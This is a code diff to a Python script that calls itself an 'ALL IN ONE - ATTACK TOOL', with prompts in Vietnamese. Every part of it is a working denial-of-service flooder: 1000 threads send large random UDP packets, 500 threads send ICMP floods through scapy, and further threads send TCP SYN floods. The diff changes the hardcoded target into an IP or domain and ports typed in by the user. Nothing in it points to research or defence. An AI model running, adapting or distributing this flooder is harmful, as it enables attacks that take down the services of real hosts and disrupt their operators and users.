@@ -4,10 +4,17 @@ import threading
 import time
 import os
 from scapy.all import IP, ICMP, TCP, send
+import sys
 
-TARGET_IP = "ip-hoac-ten-mien-cua-ban.com"
-TARGET_UDP_PORT = 27015
-TARGET_TCP_PORT = 80
+
+def show_copyright():
+    print("""
+    ===========================================
+                ALL IN ONE - ATTACK TOOL
+             Copyright © 2025 ALL IN ONE
+    ===========================================
+    """)
+
 PACKET_SIZE = 65507
 THREADS_UDP = 1000
 THREADS_ICMP = 500
@@ -24,18 +31,18 @@ def update_bandwidth(sent, received):
         total_bytes_sent += sent
         total_bytes_received += received
 
-def udp_flood():
+def udp_flood(target_ip, target_port):
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
         packet = os.urandom(PACKET_SIZE)
         while True:
             try:
-                sent = s.sendto(packet, (TARGET_IP, TARGET_UDP_PORT))
+                sent = s.sendto(packet, (target_ip, target_port))
                 update_bandwidth(sent, 0)
             except Exception as e:
                 print(f"UDP Error: {e}")
 
-def icmp_flood():
-    packet = IP(dst=TARGET_IP)/ICMP()/"FloodTest"
+def icmp_flood(target_ip):
+    packet = IP(dst=target_ip)/ICMP()/"FloodTest"
     while True:
         try:
             send(packet, verbose=0)
@@ -43,11 +50,11 @@ def icmp_flood():
         except Exception as e:
             print(f"ICMP Error: {e}")
 
-def tcp_flood():
+def tcp_flood(target_ip, target_port):
     while True:
         try:
-            ip = IP(dst=TARGET_IP)
-            syn = TCP(dport=TARGET_TCP_PORT, flags="S", seq=random.randint(1, 65535))
+            ip = IP(dst=target_ip)
+            syn = TCP(dport=target_port, flags="S", seq=random.randint(1, 65535))
             send(ip/syn, verbose=0)
             update_bandwidth(len(ip/syn), 0)
         except Exception as e:
@@ -62,24 +69,24 @@ def display_bandwidth():
         print(f"Total Sent: {sent_mb:.2f} MB | Total Received: {received_mb:.2f} MB")
         time.sleep(1)
 
-def perform_attack():
-    print(f"Starting combined UDP, ICMP, and TCP flood on {TARGET_IP}...")
+def perform_attack(target_ip, target_udp_port, target_tcp_port):
+    print(f"Starting combined UDP, ICMP, and TCP flood on {target_ip}...")
     threads = []
 
     for _ in range(THREADS_UDP):
-        thread = threading.Thread(target=udp_flood)
+        thread = threading.Thread(target=udp_flood, args=(target_ip, target_udp_port))
         thread.daemon = True
         threads.append(thread)
         thread.start()
 
     for _ in range(THREADS_ICMP):
-        thread = threading.Thread(target=icmp_flood)
+        thread = threading.Thread(target=icmp_flood, args=(target_ip,))
         thread.daemon = True
         threads.append(thread)
         thread.start()
 
     for _ in range(THREADS_TCP):
-        thread = threading.Thread(target=tcp_flood)
+        thread = threading.Thread(target=tcp_flood, args=(target_ip, target_tcp_port))
         thread.daemon = True
         threads.append(thread)
         thread.start()
@@ -103,4 +110,13 @@ def perform_attack():
     print(f"Total Received: {received_mb:.2f} MB")
 
 if __name__ == "__main__":
-    perform_attack()
+    show_copyright()
+    try:
+        target_ip = input("Nhập IP hoặc tên miền mục tiêu: ")
+        target_udp_port = int(input("Nhập cổng UDP mục tiêu (vd: 27015): "))
+        target_tcp_port = int(input("Nhập cổng TCP mục tiêu (vd: 80): "))
+        perform_attack(target_ip, target_udp_port, target_tcp_port)
+    except ValueError:
+        print("Lỗi nhập liệu. Vui lòng nhập đúng IP, tên miền và cổng.")
+    except KeyboardInterrupt:
+        print("\nTấn công đã dừng.")
